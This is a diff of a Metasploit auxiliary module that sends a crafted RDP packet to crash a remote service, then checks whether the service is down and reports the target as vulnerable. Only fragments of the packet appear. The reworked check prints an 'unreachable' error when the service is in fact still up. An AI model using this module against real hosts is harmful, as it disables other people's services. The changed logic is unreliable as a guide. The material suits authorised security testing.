@@ -1,8 +1,6 @@
 ##
-# This file is part of the Metasploit Framework and may be subject to
-# redistribution and commercial restrictions. Please see the Metasploit
-# Framework web site for more information on licensing and terms of use.
-#   http://metasploit.com/framework/
+# This module requires Metasploit: http//metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
 ##
 
 require 'msf/core'
@@ -54,6 +52,7 @@ class Metasploit3 < Msf::Auxiliary
   def is_rdp_up
     begin
       connect
+      disconnect
       return true
     rescue Rex::ConnectionRefused
       return false
@@ -138,15 +137,24 @@ class Metasploit3 < Msf::Auxiliary
       "\x02\xF0\x80"     +  # X.224
       "\x21\x80"            # T.125
 
+    unless is_rdp_up
+      print_error("#{rhost}:#{rport} - RDP Service Unreachable")
+      return
+    end
+
     connect
     print_status("#{rhost}:#{rport} - Sending #{self.name}")
     sock.put(pkt)
-    select(nil, nil, nil, 3)
+    Rex.sleep(3)
     disconnect
     print_status("#{rhost}:#{rport} - #{pkt.length.to_s} bytes sent")
 
     print_status("#{rhost}:#{rport} - Checking RDP status...")
-    if not is_rdp_up
+
+    if is_rdp_up
+      print_error("#{rhost}:#{rport} - RDP Service Unreachable")
+      return
+    else
       print_good("#{rhost}:#{rport} seems down")
       report_vuln({
         :host => rhost,
@@ -155,9 +163,8 @@ class Metasploit3 < Msf::Auxiliary
         :refs => self.references,
         :info => "Module #{self.fullname} successfully crashed the target system via RDP"
       })
-    else
-      print_status("#{rhost}:#{rport} is still up")
     end
+
   end
 
 end
